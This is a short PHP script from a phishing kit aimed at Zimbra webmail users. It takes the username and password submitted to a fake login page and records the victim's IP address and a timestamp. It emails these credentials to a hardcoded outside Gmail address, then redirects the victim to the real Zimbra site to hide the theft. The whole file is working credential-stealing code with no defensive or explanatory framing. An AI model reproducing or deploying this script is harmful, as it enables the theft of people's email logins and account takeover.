<?php
$adddate = date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message  = "--------------+ E-mail Spam ReZulT +--------------\n";
$message .= "E-mail: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "--------------------------------------------------\n";
$message .= "IP Address         : $ip\n";
$message .= "Date & Time         : $adddate\n";
$message .= "--+ Created in 2017 By MARO+--\n";

$recipient = "philliptanaka01@gmail.com";
$subject = "Zimbra Loginz Result";
$headers = "From:Zimbra";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "UMD ReZulTS", $message);
if (mail($recipient,$subject,$message,$headers))
header('Location: http://www.zimbra.com/');

 ?>